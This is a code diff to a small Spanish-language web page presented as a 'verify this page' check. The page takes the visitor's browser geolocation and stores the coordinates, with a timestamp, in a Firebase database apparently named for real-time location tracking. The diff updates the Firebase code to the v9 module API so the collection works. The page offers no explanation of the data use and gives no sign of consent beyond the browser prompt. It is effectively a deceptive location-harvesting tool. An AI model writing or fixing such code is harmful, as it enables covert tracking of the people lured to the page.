@@ -4,15 +4,17 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verifica esta página</title>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
 </head>
 <body>
     <h2>Verifica esta página</h2>
     <p id="status">Esperando ubicación...</p>
 
-    <script>
-        // 🔹 Configuración de Firebase (Asegúrate de que los datos son correctos)
+    <script type="module">
+        // 🔹 Importar Firebase correctamente
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";
+
+        // 🔹 Configuración de Firebase
         const firebaseConfig = {
             apiKey: "AIzaSyBbjHMxaekPinCF54GDfZVhl0u06HKMwZg",
             authDomain: "ubicacionentiemporeal-5ef91.firebaseapp.com",
@@ -24,9 +26,9 @@
             measurementId: "G-RK2KEYN38N"
         };
 
-        // 🔹 Inicializar Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
+        // 🔹 Inicializar Firebase correctamente
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
         function obtenerUbicacion() {
             if (navigator.geolocation) {
@@ -36,8 +38,8 @@
                         let lon = pos.coords.longitude;
                         let id_usuario = Math.random().toString(36).substring(7); // 🔹 Genera un ID aleatorio
 
-                        // 🔹 Guardar en Firebase
-                        db.ref("ubicaciones/" + id_usuario).set({
+                        // 🔹 Guardar en Firebase (versión 9)
+                        set(ref(db, "ubicaciones/" + id_usuario), {
                             latitud: lat,
                             longitud: lon,
                             timestamp: new Date().toISOString()
